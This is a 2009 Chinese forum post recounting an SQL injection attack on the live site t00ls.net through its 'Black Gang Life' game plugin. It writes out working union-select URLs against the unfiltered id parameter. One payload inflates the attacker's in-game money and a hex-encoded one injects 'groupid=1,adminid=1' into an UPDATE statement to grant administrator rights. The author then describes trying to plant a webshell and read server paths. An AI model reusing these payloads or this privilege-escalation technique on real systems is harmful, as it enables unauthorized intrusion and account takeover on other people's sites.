@@ -1,0 +1,35 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+射T00ls.net的方法------------《黑道生涯》之漏洞
+D8888D主贴内容-------------------------------------------------------
+ 
+
+现在《黑道生涯》已经被删除了，不好截图了，我就简单一点说。 http://www.t00ls.net/blackband.php?mode=yule&action=enjoy&id=2
+复制代码这个链接，是在《玩乐》里面购买馒头。增加体力的。
+ID变量冇过滤。 http://www.t00ls.net/blackband.php?mode=yule&action=enjoy&id=2 and 1=2 union select 1,2,3,4/*
+复制代码如图。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0907/0907241541d10cb9cb6aa98f11.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTU3N3xlMjBiNzQ5M3wxMjg2NDgyNzAxfDIwZjBHRitRVmI4MjFKYVZRVzlkZ0JhcjhLL2g4M1ZNdXdsTzlGK29pNGxrWHRn&nothumb=yes]链接标记下载[/url] (15.26 KB)
+
+2009-7-24 15:41
+我直接访问 http://www.t00ls.net/blackband.php?mode=yule&action=enjoy&id=2and 1=2 union select 1,2,3,4/*
+复制代码之后，我发现我的金钱减少了2个，体力增加了3点。
+原来，union select之后返回的2和3 分别加入2条到UPDATE语句里了。我没有源代码，我不知道具体语句，我只能猜测。
+一条是： UPDATE 会员数据表 SET 金钱=原来的金钱 - 2 WHERE UID=XXX
+复制代码另一条是： UPDATE 黑道生涯数据表 SET 体力=原来的体力 + 3 WHERE UID=XXX
+复制代码也就是说，我能控制这2条语句了。
+于是我访问 http://www.t00ls.net/blackband.php?mode=yule&action=enjoy&id=2 and 1=2 union select 1,-2222222222222,3,4/*
+复制代码提示：您的现金减少-22222222222222，体力增加3点。
+我一刷新，果然，我的钱变成了2222222222XXXXXX。
+然后，我直接访问。 http://www.t00ls.net/blackband.php?mode=yule&action=enjoy&id=2 and 1=2 union select 1,0x2D312C67726F757069643D312C61646D696E69643D31,3,4/*
+复制代码之后，就变成了管理员。
+0x2D312C67726F757069643D312C61646D696E69643D31是什么呢？其实就是 -1,groupid=1,adminid=1
+复制代码进入到UPDATE语句就是 UPDATE 会员数据表 SET 金钱=原来的金钱 - -1,groupid=1,adminid=1 WHERE UID=XXX
+复制代码进了后台，用OLDJUN发的DISUCUZ非创始人得WEBSHELL搞个SHELL,才发现，T00LS.NET论坛安全做得太好了。论坛缓存目录forumdata、插件目录PluS都禁止执行任何脚本。
+实在是冇办法啊。
+
+记得有人曾经发现过T00LS.NET在服务器的绝对路径，我搜到了，读PHP也发现当前的数据库连接用户没有权限。只能到这里了。
+改改数据，看看数据。哎。遗憾啊。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0907/0907241541fb1543f3e6144753.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MTU3OHwxYWJlNmI3NXwxMjg2NDgyNzAxfDIwZjBHRitRVmI4MjFKYVZRVzlkZ0JhcjhLL2g4M1ZNdXdsTzlGK29pNGxrWHRn&nothumb=yes]链接标记下载[/url] (23.43 KB)
+
+2009-7-24 15:41
